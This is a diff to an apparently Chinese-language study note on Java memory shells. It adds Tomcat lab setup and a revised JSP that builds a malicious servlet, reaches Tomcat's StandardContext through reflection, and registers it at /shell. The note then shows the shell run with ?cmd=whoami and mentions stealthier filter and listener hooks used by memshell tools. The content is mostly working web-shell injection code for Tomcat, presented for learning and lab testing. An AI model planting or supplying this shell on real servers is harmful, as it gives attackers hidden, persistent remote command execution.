@@ -21,6 +21,7 @@
   - [java instrumentation](#java-instrumentation)
     - [Java Agent](#java-agent)
   - [示例 -Tomcat-ServletAPI型内存马](#示例--tomcat-servletapi型内存马)
+    - [环境配置](#环境配置)
 
 ---
 
@@ -295,14 +296,34 @@ Java agent是一种特殊的Java程序（Jar文件），它是Instrumentation的
 
 ## 示例 -Tomcat-ServletAPI型内存马
 
+### 环境配置
+
+[安装Tomcat](../../../../../Language/Java/Java.md#tomcat安装) -> [配置Tomcat](../../../../../Language/Java/Java.md#tomcat配置)
+
+在 Tomcat 的 `webapps` 目录下, 常见一个新的子目录, 例如 `java-memshell-tomcat-servletapi`
+
+Tomcat 会自动部署这个应用, 可以通过 `http://localhost:8080/java-memshell-tomcat-servletapi` 访问此应用
+
+![image-20240911143708373](http://cdn.ayusummer233.top/DailyNotes/202409111437463.png)
+
+---
+
 下面的代码先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。
 
 ```java
+<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
 <%@ page import="java.io.IOException" %>
 <%@ page import="java.io.InputStream" %>
 <%@ page import="java.util.Scanner" %>
 <%@ page import="org.apache.catalina.core.StandardContext" %>
 <%@ page import="java.io.PrintWriter" %>
+<%@ page import="javax.servlet.Servlet" %>
+<%@ page import="javax.servlet.ServletConfig" %>
+<%@ page import="javax.servlet.ServletRequest" %>
+<%@ page import="javax.servlet.ServletResponse" %>
+<%@ page import="javax.servlet.ServletException" %>
+<%@ page import="org.apache.catalina.Wrapper" %>
+<%@ page import="java.lang.reflect.Field" %>
 
 <%
     // 创建恶意Servlet
@@ -342,28 +363,55 @@ Java agent是一种特殊的Java程序（Jar文件），它是Instrumentation的
         }
     };
 
-    %>
-<%
     // 获取StandardContext
-    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
+    StandardContext standardCtx = null;
+    ServletContext servletContext = request.getServletContext();
+    Field appContextField = servletContext.getClass().getDeclaredField("context");
+    appContextField.setAccessible(true);
+    Object appContext = appContextField.get(servletContext);
 
-    // 用Wrapper对其进行封装
-    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
-    newWrapper.setName("jweny");
-    newWrapper.setLoadOnStartup(1);
-    newWrapper.setServlet(servlet);
-    newWrapper.setServletClass(servlet.getClass().getName());
+    Field standardCtxField = appContext.getClass().getDeclaredField("context");
+    standardCtxField.setAccessible(true);
+    standardCtx = (StandardContext) standardCtxField.get(appContext);
 
-    // 添加封装后的恶意Wrapper到StandardContext的children当中
-    standardCtx.addChild(newWrapper);
+    if (standardCtx != null) {
+        // 用Wrapper对其进行封装
+        org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
+        newWrapper.setName("summermemshel");
+        newWrapper.setLoadOnStartup(1);
+        newWrapper.setServlet(servlet);
+        newWrapper.setServletClass(servlet.getClass().getName());
 
-    // 添加ServletMapping将访问的URL和Servlet进行绑定
-    standardCtx.addServletMapping("/shell","jweny");
+        // 添加封装后的恶意Wrapper到StandardContext的children当中
+        standardCtx.addChild(newWrapper);
+
+        // 添加ServletMapping将访问的URL和Servlet进行绑定
+        standardCtx.addServletMappingDecoded("/shell", "summermemshel");
+    } else {
+        out.println("Failed to get StandardContext");
+    }
 %>
 ```
 
+新建一个 `index.jsp` 文件, 将上述代码贴在其中
 
+访问 `http://localhost:8080/java-memshell-tomcat-servletapi/index.jsp`
+
+![image-20240911143825536](http://cdn.ayusummer233.top/DailyNotes/202409111438611.png)
+
+验证 servletapi 内存马: `http://localhost:8080/java-memshell-tomcat-servletapi/shell?cmd=whoami`
+
+> 不可以加 `/index.jsp`, 否则会 404
+>
+> ![image-20240911181416841](http://cdn.ayusummer233.top/DailyNotes/202409111814029.png)
+>
+> ![image-20240911181437409](http://cdn.ayusummer233.top/DailyNotes/202409111814471.png)
+
+使用新增servlet的方式就需要绑定指定的URL。
+
+如果我们想要更加隐蔽，做到内存马与URL无关，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令，那就得通过注入新的或修改已有的filter或者listener的方式来实现了。
+
+比如早期 rebeyond 师傅开发的 memshell，就是通过修改 `org.apache.catalina.core.ApplicationFilterChain` 类的 `internalDoFilter` 方法来实现的，后期冰蝎最新版本的内存马为了实现更好的兼容性，选择 hook `javax.servlet.http.HttpServlet#service` 函数，在 weblogic 选择hook `weblogic.servlet.internal.ServletStubImpl#execute` 函数。
 
 
 
